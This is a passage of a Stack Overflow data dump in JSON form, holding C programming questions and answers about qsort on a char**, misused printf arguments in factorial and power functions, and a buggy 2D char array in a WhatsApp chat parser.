"user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "edited": false, "score": 1, "creation_date": 1518023772, "post_id": 48669339, "comment_id": 84337084, "body": "@JoshAbraham Not in the comments. Search around about initialization of pointers with string literals, there are plenty of questions about it."}], "answers": [{"comments": [{"owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518023379, "post_id": 48669424, "comment_id": 84336871, "body": "Is there any way to get len to be needed size for char** case?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518023403, "post_id": 48669424, "comment_id": 84336881, "body": "@MiradilZeynalli No, you have to keep track of it yourself."}, {"owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518025460, "post_id": 48669424, "comment_id": 84338055, "body": "Thanks for helping)"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 0, "last_activity_date": 1518023358, "last_edit_date": 1518023358, "creation_date": 1518023034, "answer_id": 48669424, "question_id": 48669339, "link": "https://stackoverflow.com/questions/48669339/how-to-qsort-char/48669424#48669424", "title": "How to qsort char**?", "body": "<p>In the first case, since <code>s</code> is a pointer, <code>sizeof(s)</code> will give you the size <em>of the pointer</em>, not what it points to. That of course leads to <code>len</code> being equal to <code>1</code> (the size of a pointer divided by the size of a pointer).</p>\n\n<p>In the second case <code>s</code> is no longer a pointer, but an array of four elements. It's type is <code>char*[4]</code>.</p>\n\n<p>You can only use the sizeof-division \"trick\" with actual arrays.</p>\n\n<p>If you want to use pointers and dynamically allocated \"arrays\" you need to keep track of the number of elements yourself.</p>\n"}, {"comments": [{"owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518023294, "post_id": 48669432, "comment_id": 84336816, "body": "There is no error in calloc function, I already checked size in other project, and it stores needed amount of strings. But I still dont understand, how to qsort char**"}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518023340, "post_id": 48669432, "comment_id": 84336842, "body": "@MiradilZeynalli.: You can&#39;t apply <code>sizeof</code> over a pointer and expect it to return the size of the allocated memory! That&#39;s where you were wrong."}, {"owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "edited": false, "score": 0, "creation_date": 1518024140, "post_id": 48669432, "comment_id": 84337305, "body": "Keeping track of the size of array worked. Thanks a lot)"}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": true, "score": 1, "last_activity_date": 1518023676, "last_edit_date": 1592644375, "creation_date": 1518023063, "answer_id": 48669432, "question_id": 48669339, "link": "https://stackoverflow.com/questions/48669339/how-to-qsort-char/48669432#48669432", "title": "How to qsort char**?", "body": "<p>This code is correct code.<code>char* s[] = {&quot;Banana&quot;, &quot;Apple&quot;, &quot;Grape&quot;, &quot;Strawberry&quot;};</code> is correct and will behave as you expect it to be.</p>\n<p>To make a clear statement - your use of <code>sizeof</code> is valid and it won't be a problem. <em>Array won't decay here</em> when used as an operand to <code>sizeof</code>.</p>\n<p><code>char **</code> is indeed the right thing. Address of each element is being passed to <code>cmp</code> function.</p>\n<p><em>The glitch is</em> :-</p>\n<p>In case <code>char** s = calloc ...</code> it would be wrong to use the <code>sizeof</code> because it is a pointer which contains the address of the allocated chunk. There is no way you can know the amount of memory allocated to it. So when you use the code with <code>char**s = calloc ..</code> specify the size of the array (not using <code>sizeof</code>) and it would work.</p>\n<h3>Is there any way to get len to be needed size for <code>char**</code> case?</h3>\n<p>Yes. You need to keep it separately in a variable. You <strong>can't</strong> apply <strong><code>sizeof</code></strong> and get the allocated memory size from a pointer variable.</p>\n<h3>How to make both work?</h3>\n<p>As already mentioned everything else (comparator function etc) would be same except now you have to keep track of how much you allocate and it will be passed to the <code>qsort</code>. You are already allocating the amount of memory using the hardcoded value of <code>4</code>. Make a variable <code>const int size = 4</code> and then keep it and use it accordingly.</p>\n<p>Long story short - problem was in getting the size of the number of elements that you wanted to sort.</p>\n"}, {"tags": [], "owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "is_accepted": false, "score": 1, "last_activity_date": 1518024522, "creation_date": 1518024522, "answer_id": 48669911, "question_id": 48669339, "link": "https://stackoverflow.com/questions/48669339/how-to-qsort-char/48669911#48669911", "title": "How to qsort char**?", "body": "<p>The problem that you are having is with the variable <code>len</code>. When you want to allocate memory via functions as <code>malloc()</code> and <code>calloc()</code>, it is better that you use a variable for the size of memory to be allocated. So instead of writing:</p>\n\n<pre><code>char** s;\ns = calloc(4, sizeof(char *));\n</code></pre>\n\n<p>write:</p>\n\n<pre><code>size_t szAlloc = 4;\nchar **s = calloc(szAlloc, sizeof(char *));\n</code></pre>\n\n<p>This way, you can keep track of the allocated memory and you can use this value when needed. As the variable <code>s</code> is declared as a pointer, applying the operator <code>sizeof()</code> on it will yield the size of that pointer, not the size of the memory allocated by <code>calloc()</code>, and dividing it by <code>sizeof(char *)</code> will give <code>1</code> as a result.</p>\n\n<p>Using the variable <code>szAlloc</code> you can call <code>qsort()</code> as:</p>\n\n<pre><code>qsort(s, szAlloc, sizeof(char *), cmp);\n</code></pre>\n\n<p>and this should give a proper result.</p>\n"}], "owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 749, "favorite_count": 0, "accepted_answer_id": 48669432, "answer_count": 3, "score": 1, "last_activity_date": 1518024522, "creation_date": 1518022795, "question_id": 48669339, "link": "https://stackoverflow.com/questions/48669339/how-to-qsort-char", "title": "How to qsort char**?", "body": "<p>I want to sort an array of strings which was declared as following:</p>\n\n<pre><code>char** s;\ns = calloc(4, sizeof(char *));\ns[0] = \"Banana\";\ns[1] = \"Apple\";\ns[2] = \"Grape\";\ns[3] = \"Strawberry\";\n</code></pre>\n\n<p>and for this I used qsort function:</p>\n\n<pre><code>size_t len = sizeof(s) / sizeof(char *);\nqsort(s, len, sizeof(char *), cmp);\n</code></pre>\n\n<p>where cmp looks like this:</p>\n\n<pre><code>int cmp(const void* s1, const void* s2)\n{\n    const char** a = (const char**) s1;\n    const char** b = (const char**) s2;\n    return strcmp(*a, *b);\n}\n</code></pre>\n\n<p>However, for this code, nothing is sorted and output is in the same order as it is in array. The problem is, I checked it with another way, where I declared array as (qsort and cmp stays untouched):</p>\n\n<pre><code>char* s[] = {\"Banana\", \"Apple\", \"Grape\", \"Strawberry\"};\n</code></pre>\n\n<p>and the output was perfectly sorted. I kind of understand it is because of, first method is double(pointer to pointer) pointer and the second one is pointer to array, but the work principles of them are the same. Any ideas how to sort char** s?. Thanks beforehand</p>\n"}, {"tags": ["c", "function", "factorial"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1518021969, "post_id": 48669023, "comment_id": 84335919, "body": "If that&#39;s all that doesn&#39;t work, why are you burdening the post and us with everything else? Please read about how you should create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518050025, "post_id": 48669023, "comment_id": 84349699, "body": "Enable all compile warnings to speed problem solving."}], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 1, "last_activity_date": 1518023492, "last_edit_date": 1518023492, "creation_date": 1518022060, "answer_id": 48669081, "question_id": 48669023, "link": "https://stackoverflow.com/questions/48669023/my-factorial-and-power-functions-output-a-number-in-the-millions-when-it-shouldn/48669081#48669081", "title": "My factorial and power functions output a number in the millions when it shouldn&#39;t and I don&#39;t know how to fix it(in c)", "body": "<p>Your <code>printf</code> for the factorial and power cases are mal-formed, you are passing the arguments by pointer; you need to pass them by value. </p>\n\n<p>After that, you'll realise quickly that you'll overflow the <code>int</code> type in the factorial and power cases. An <code>int</code> in general is only good up to and including <code>7!</code> in truly portable C++. Consider using an <code>unsigned long long</code>, which will give you values up to and including <code>21!</code>. Use <code>\"%ull\"</code> for an <code>unsigned long long</code> in the formatter.</p>\n\n<p>Finally, pass the <em>types</em> explicitly to your functions in C: your style has been explicitly disallowed since C99.</p>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 8691550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72b798618cc6527e6cfcf14c902abaeb?s=128&d=identicon&r=PG", "display_name": "user8691550", "link": "https://stackoverflow.com/users/8691550/user8691550"}, "is_accepted": false, "score": 3, "last_activity_date": 1518022230, "creation_date": 1518022230, "answer_id": 48669134, "question_id": 48669023, "link": "https://stackoverflow.com/questions/48669023/my-factorial-and-power-functions-output-a-number-in-the-millions-when-it-shouldn/48669134#48669134", "title": "My factorial and power functions output a number in the millions when it shouldn&#39;t and I don&#39;t know how to fix it(in c)", "body": "<p>You are using &amp; in the print statement that prints the address of the variable used.\nCorrect the statements in their respective function as follows :</p>\n\n<pre><code>printf(\"The factorial is %i\", factorial);\n\nprintf(\"%d to the %d equals %d\", num1, num2, number);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1518022567, "creation_date": 1518022567, "answer_id": 48669252, "question_id": 48669023, "link": "https://stackoverflow.com/questions/48669023/my-factorial-and-power-functions-output-a-number-in-the-millions-when-it-shouldn/48669252#48669252", "title": "My factorial and power functions output a number in the millions when it shouldn&#39;t and I don&#39;t know how to fix it(in c)", "body": "<p>You're using the wrong format specifiers to <code>printf</code> to print the results, and you're not passing the actual values you want to print:</p>\n\n<pre><code>printf(\"The factorial is %i\", &amp;factorial);\n</code></pre>\n\n<p>You're passing in the address of <code>factorial</code> instead of its value, so it's printing that instead.  Just pass the result directly instead of its address:</p>\n\n<pre><code>printf(\"The factorial is %i\", factorial);\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 9328628, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-tmikxw6HzkE/AAAAAAAAAAI/AAAAAAAAAHk/igDSJouGT_A/photo.jpg?sz=128", "display_name": "Take To Your Guns", "link": "https://stackoverflow.com/users/9328628/take-to-your-guns"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1518023492, "creation_date": 1518021866, "last_edit_date": 1518022096, "question_id": 48669023, "link": "https://stackoverflow.com/questions/48669023/my-factorial-and-power-functions-output-a-number-in-the-millions-when-it-shouldn", "title": "My factorial and power functions output a number in the millions when it shouldn&#39;t and I don&#39;t know how to fix it(in c)", "body": "<blockquote>\n  <p>I am trying to write a sort of calculator program and i can get everything but my factorial and power functions to work. They output a number in the millions no matter how small the number is and i don't see a problem with the code. (I just started learning C recently so assume the extent of my knowledge is everything in this code)</p>\n</blockquote>\n\n<pre><code>int iFactorial(num1){//needs help returns a number in the millions no matter what\n\n    int i, factorial=1;\n    printf(\"Enter a positive number: \");\n    scanf(\"%d\", &amp;num1);\n    for(i=1; i&lt;=num1; i++)\n            factorial*=i;\n            printf(\"The factorial is %i\", &amp;factorial);\n    return 0;\n\n}\nint fPower(num1,num2){//needs help, same as above\n    int i, number = 1;\n    printf(\"Enter the number you want to raise to a power: \\n\");\n    scanf(\"%d\", &amp;num1);\n    printf(\"Enter the exponent: \");\n    scanf(\"%d\", &amp;num2);\n\n    for(i=0; i&lt;num2; i++)\n        number*=num1;\n        printf(\"%d to the %d equals %d\", &amp;num1, &amp;num2, &amp;number);\n    return 0;  \n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1518021247, "post_id": 48668792, "comment_id": 84335427, "body": "haven&#39;t you posted the same question recently? <a href=\"https://stackoverflow.com/questions/48595813/c-programm-array-doesnt-fill-correctly\" title=\"c programm array doesnt fill correctly\">stackoverflow.com/questions/48595813/&hellip;</a>"}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1518021312, "post_id": 48668792, "comment_id": 84335462, "body": "I deleted the thread, I opened a new one."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1518021325, "post_id": 48668792, "comment_id": 84335469, "body": "Unrelated to your problem, but <a href=\"http://en.cppreference.com/w/c/io/fgetc\" rel=\"nofollow noreferrer\"><code>fgetc</code></a> returns an <code>int</code>. This is actually important when you check for <code>EOF</code>."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1518021394, "post_id": 48668792, "comment_id": 84335518, "body": "that&#39;s not really the way SO works. You should edit your old question instead. Posting the same question over and over will get you banned after a while. Be careful with that. Also, your question is off-topic: posting as much code and expecting others to debug it for you isn&#39;t very nice. a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> is much better."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1518021427, "post_id": 48668792, "comment_id": 84335539, "body": "<code>chr != EOF</code> is wrong: you test for EOF after the fact. You must test <code>if ((chr = fgetc(fp)) != EOF)</code>"}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "edited": false, "score": 0, "creation_date": 1518021446, "post_id": 48668792, "comment_id": 84335555, "body": "Yea, there should only be a little problem, but I can&#39;t see it"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518021462, "post_id": 48668792, "comment_id": 84335569, "body": "It also seems that you should spend some time to <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your programs</a>."}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1518021499, "post_id": 48668792, "comment_id": 84335594, "body": "@PaulOgilvie isn&#39;t it the same...?"}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518021649, "post_id": 48668792, "comment_id": 84335693, "body": "@Someprogrammerdude you are rght.."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1518021737, "post_id": 48668792, "comment_id": 84335756, "body": "Treating the strings as arrays of spaces looks very odd. When printing with <code>printf(&quot;%c&quot;,end_arr3[i][k]);</code> you print a whole lot of trailing spaces. Why not treat it as strings, with a terminating null character?"}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "edited": false, "score": 0, "creation_date": 1518021817, "post_id": 48668792, "comment_id": 84335811, "body": "That would be good, but how can I set up that the string gets terminated after the last char of the name in the end_array?"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1518021866, "post_id": 48668792, "comment_id": 84335851, "body": "No, it is not the same because you first get <code>chr</code> (that happens to be EOF) and <i>you process that char</i> in your <code>else</code> part and beyond, and only then will the <code>for</code>condition be tested again to conclude EOF."}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "edited": false, "score": 0, "creation_date": 1518021941, "post_id": 48668792, "comment_id": 84335894, "body": "I will test this now"}, {"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "edited": false, "score": 0, "creation_date": 1518022030, "post_id": 48668792, "comment_id": 84335953, "body": "After doing this, the array is completely blank"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1518022981, "post_id": 48668792, "comment_id": 84336587, "body": "Does your input contain &#39;\\n&#39; newline characters to show the beginning of another record?  If so, I may consider a <code>fgets()</code> approach as this will give you some nice strings to work with instead of the char fun you have now."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1518076879, "post_id": 48668792, "comment_id": 84357767, "body": "I have the impression that everyone here is feeding the help vampire."}], "answers": [{"comments": [{"owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "edited": false, "score": 1, "creation_date": 1518021600, "post_id": 48668911, "comment_id": 84335658, "body": "Ok I have done that, now the first line is correct, the rest of the lines is like before"}], "tags": [], "owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "is_accepted": false, "score": 1, "last_activity_date": 1518021490, "creation_date": 1518021490, "answer_id": 48668911, "question_id": 48668792, "link": "https://stackoverflow.com/questions/48668792/2-dimensional-char-array-gets-filled-with-wrong-input-in-c/48668911#48668911", "title": "2-Dimensional char array gets filled with wrong input in C", "body": "<p>You've declared <code>end_arr3</code> backwards:</p>\n\n<pre><code>char end_arr3[nl][members];\n</code></pre>\n\n<p>where <code>nl</code> is the <em>length</em> of the space for each string and <code>members</code> is the <em>number</em> of strings.  But this sets aside space for <code>nl</code> strings each of length <code>members</code>.</p>\n"}], "owner": {"reputation": 211, "user_id": 8310251, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh5.googleusercontent.com/-q8U7TGxs1HA/AAAAAAAAAAI/AAAAAAAAAFs/8uZhice7juM/photo.jpg?sz=128", "display_name": "ProjectX", "link": "https://stackoverflow.com/users/8310251/projectx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1518022658, "creation_date": 1518021105, "last_edit_date": 1518022658, "question_id": 48668792, "link": "https://stackoverflow.com/questions/48668792/2-dimensional-char-array-gets-filled-with-wrong-input-in-c", "title": "2-Dimensional char array gets filled with wrong input in C", "body": "<p>I programm a Whatsapp chat analyser. It is written in C. First, a exportet  Whatsapp-chat gets opened by my programme with fopen();...Later it should save the names of the members of the Chat in a temporary array, then they should be written(if the same name isn`t already in the end_array) in the end_array. Else, the the line will be skipped. </p>\n\n<p><strong>Detection of the names of the members:</strong></p>\n\n<p>The chars between - 'my name' : gets saved</p>\n\n<p>07.11.17, 14:38 - Alan (TFO): Alan</p>\n\n<p><strong>The problem:</strong> End_Array gets filled with strange chars (Seee Image below) How can I solve this? In the first line should only be 'andisville', in the second line Florian Steger ....</p>\n\n<p><a href=\"https://i.stack.imgur.com/bOxmS.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/bOxmS.png\" alt=\"Problem:\"></a></p>\n\n<p><strong>Names:</strong>\n<a href=\"https://i.stack.imgur.com/Opn5i.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Opn5i.png\" alt=\"Chat txt\"></a></p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint printEndArr(int nl, int members, char end_arr3[nl][members]);\nint clearArray(int nl, int members, char end_arr3[nl][members]);\n\nint main()\n{\n   FILE *fp;\n   fp = fopen(\"datei3.txt\", \"r\");\n\n   int a = 0;\n   int i = 0; \n   int k = 0; \n   int c = 0; \n   int c2 = -1; \n   int j = 0;\n   int members = 0; \n   int m; \n   int n,strc  = 0;\n   int x,z, zus = 1, nl = 30,zl =0,zle =0,zlex = 0,firc;    \n   //Don't ask me why I formatted the declarations so bad\n\n   char chr, *statBeff; \n\n   scanf(\"%d\",&amp;members);\n   char end_arr3[nl][members];\n   char temp_array[nl];\n   int counter[members];\n\n   clearArray(nl,members, end_arr3);\n\n   if(fp == NULL)\n   {\n      printf(\"Achtung die Datei existiert nicht!\");//The File doesn`t exist\n   }\n   else\n   {\n      for(i = 0; chr != EOF; i++)       //Read every char of the text file\n      { \n         chr = fgetc(fp);\n         if(chr == '-')\n         {\n            chr = fgetc(fp);\n            if(chr == ' ')\n            {\n               j=0;\n               while((chr = fgetc(fp))!=':')\n               {\n                  temp_array[j] = chr;\n                  j++;\n               }\n\n               temp_array[j] = '\\0'; //The tempArray gets terminated by '\\0'\n\n               if((strstr(temp_array, \"Betreff\") == NULL)) //If the temporary array doesn't contain the String 'Betreff'..\n               {\n                  for(z=0; z &lt; members;z++)\n                  {\n                     if(strcmp(end_arr3[z],temp_array)==0) //Prove if the name of the temp_array is already in the endarray\n                     {\n                        strc = 1;\n                        a--;                \n                        break;\n                     }  \n                  }\n                  if (strc == 0)//If the temparray isn't in the end array:\n                  {\n                     strcpy(end_arr3[a], temp_array);\n                  }\n               }\n               else\n               {\n                  a--;\n               }\n\n               strc =0;\n               ++a;\n               if(a == members) //If all members of the whatsapp chat are found the for-loop will be determinated\n               break;\n            }\n         }\n      }       \n   }       \n   printEndArr(nl,members, end_arr3); //end array gets printed\n\n   fclose(fp);\n\n   return 0;\n}\n\nint printEndArr(int nl, int members, char 